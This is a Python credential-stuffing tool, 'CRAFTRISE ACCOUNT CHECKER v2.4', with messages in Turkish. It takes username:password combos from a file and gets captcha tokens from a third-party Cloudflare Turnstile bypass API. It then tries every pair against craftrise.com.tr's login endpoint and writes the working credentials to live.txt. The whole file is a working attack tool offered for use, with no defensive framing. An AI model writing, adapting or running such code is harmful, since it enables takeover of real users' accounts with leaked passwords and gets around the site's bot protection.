import os
import sys
import time
import json
import requests

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        GREEN = RED = YELLOW = CYAN = BLUE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""

CONFIG_FILE = "config.json"

stats = {
    "total": 0,
    "checked": 0,
    "live": 0,
    "dead": 0,
    "errors": 0
}

def banner():
    print(f"""{Fore.CYAN}{Style.BRIGHT}
  ╔══════════════════════════════════════════════╗
  ║        CRAFTRISE ACCOUNT CHECKER v2.4        ║
  ║        Developer {Fore.GREEN}wEzAxy{Fore.CYAN}                      ║
  ╚══════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

def test_api_key(api_key):
    url = "https://turnstile-bypass-api1.p.rapidapi.com/check"
    payload = {
        "url": "http://craftrise.com.tr/",
        "sitekey": "0x4AAAAAAA4cK60wpgOTyti9",
        "type": "cfinvisible"
    }
    headers = {
        "x-rapidapi-key": api_key,
        "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code in [401, 403]:
            return False
        data = response.json()
        if "message" in data and ("not subscribed" in data["message"].lower() or "unauthorized" in data["message"].lower()):
            return False
        return True
    except Exception:
        return False

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data.get("api_key")
        except Exception:
            return None
    return None

def save_config(api_key):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({"api_key": api_key}, f, indent=4)
    except Exception as e:
        print(f"{Fore.RED}[X] Config kaydedilemedi: {e}{Style.RESET_ALL}")

def get_api_key():
    saved_key = load_config()
    
    if saved_key and len(saved_key) > 5:
        print(f"{Fore.YELLOW}[*] Kayıtlı API Key test ediliyor...{Style.RESET_ALL}")
        if test_api_key(saved_key):
            print(f"{Fore.GREEN}[+] Kayıtlı API Key geçerli!{Style.RESET_ALL}")
            return saved_key
        else:
            print(f"{Fore.RED}[!] Kayıtlı API Key geçersiz veya süresi dolmuş!{Style.RESET_ALL}")
            if os.path.exists(CONFIG_FILE):
                os.remove(CONFIG_FILE)

    while True:
        print(f"\n{Fore.YELLOW}[!] Lütfen RapidAPI Turnstile Bypass API Key'inizi girin:{Style.RESET_ALL}")
        api_key = input("API Key: ").strip()
        
        if not api_key:
            print(f"{Fore.RED}[X] API Key boş bırakılamaz!{Style.RESET_ALL}")
            continue
            
        print(f"{Fore.YELLOW}[*] Girilen API Key doğrulanıyor...{Style.RESET_ALL}")
        if test_api_key(api_key):
            print(f"{Fore.GREEN}[+] API Key doğrulandı ve 'config.json' dosyasına kaydedildi.{Style.RESET_ALL}")
            save_config(api_key)
            return api_key
        else:
            print(f"{Fore.RED}[X] Geçersiz API Key! Lütfen tekrar deneyin.{Style.RESET_ALL}")

def bypass(api_key, retries=3):
    url = "https://turnstile-bypass-api1.p.rapidapi.com/check"
    payload = {
        "url": "http://craftrise.com.tr/",
        "sitekey": "0x4AAAAAAA4cK60wpgOTyti9",
        "type": "cfinvisible"
    }
    headers = {
        "x-rapidapi-key": api_key,
        "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
        "Content-Type": "application/json"
    }
    
    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, headers=headers, timeout=15)
            data = response.json()
            if data.get('captcha_token'):
                return data.get('captcha_token')
        except Exception:
            time.sleep(1)
            
    return None

def check():
    banner()
    
    if not os.path.exists("combo.txt"):
        print(f"{Fore.RED}[X] 'combo.txt' dosyası bulunamadı! Lütfen aynı dizine oluşturun.{Style.RESET_ALL}")
        return

    api_key = get_api_key()

    with open("combo.txt", "r", encoding="utf-8") as f:
        combos = [line.strip() for line in f if line.strip()]

    stats["total"] = len(combos)
    if stats["total"] == 0:
        print(f"{Fore.RED}[X] 'combo.txt' dosyası boş!{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}[+] Toplam {stats['total']} adet hesap yüklendi. Tarama başlatılıyor...\n{Style.RESET_ALL}")
    time.sleep(1)

    for combo in combos:
        stats["checked"] += 1
        try:
            value, password = combo.split(":", 1)
        except ValueError:
            stats["errors"] += 1
            continue

        token = bypass(api_key)
        if not token:
            print(f"{Fore.YELLOW}[!] Captcha çözülemedi, atlanıyor... ({value}){Style.RESET_ALL}")
            stats["errors"] += 1
            continue

        try:
            r = requests.session()
            r.get('http://craftrise.com.tr/', headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            
            headers = {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "x-requested-with": "XMLHttpRequest",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.craftrise.com.tr",
                "referer": "https://www.craftrise.com.tr/",
                "Host": "www.craftrise.com.tr",
            }
            data = {
                "value": value,
                "password": password,
                "grecaptcharesponse": token
            }
            
            res = r.post('https://www.craftrise.com.tr/posts/post-login.php', headers=headers, data=data, timeout=10)
            result = res.json()

            if result.get("resultType") != "error":
                stats["live"] += 1
                with open("live.txt", "a", encoding="utf-8") as f:
                    f.write(f"{value}:{password}\n")
                print(f"{Fore.GREEN}[LIVE] {value}:{password} --> Başarılı Giriş!{Style.RESET_ALL}")
            else:
                stats["dead"] += 1
                print(f"{Fore.RED}[DEAD] {value}:{password}{Style.RESET_ALL}")

        except Exception as e:
            stats["errors"] += 1
            print(f"{Fore.YELLOW}[HATA] İşlem sırasında hata oluştu: {value} ({e}){Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}════════════════ TARAMA TAMAMLANDI ════════════════{Style.RESET_ALL}")
    print(f" Toplam Taranan : {stats['checked']}/{stats['total']}")
    print(f" {Fore.GREEN}Geçerli (Live) : {stats['live']}{Style.RESET_ALL}")
    print(f" {Fore.RED}Geçersiz (Dead): {stats['dead']}{Style.RESET_ALL}")
    print(f" Hatalar        : {stats['errors']}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════{Style.RESET_ALL}")

if __name__ == "__main__":
    check()
